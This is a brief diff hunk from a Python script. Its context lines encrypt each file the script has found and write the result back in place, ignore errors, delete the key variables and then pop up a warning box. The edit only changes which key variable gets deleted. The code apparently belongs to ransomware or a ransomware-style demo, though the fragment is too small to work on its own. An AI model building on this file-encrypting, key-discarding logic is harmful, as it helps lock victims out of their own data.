@@ -66,7 +66,8 @@ for f in tool.files_found:
                 fl.write(encrypted_data)
     except Exception as error:
         pass
-del node_key, tmp_key
+
+del node_key
 gc.collect()
 
 messagebox.showwarning(title="Hello",
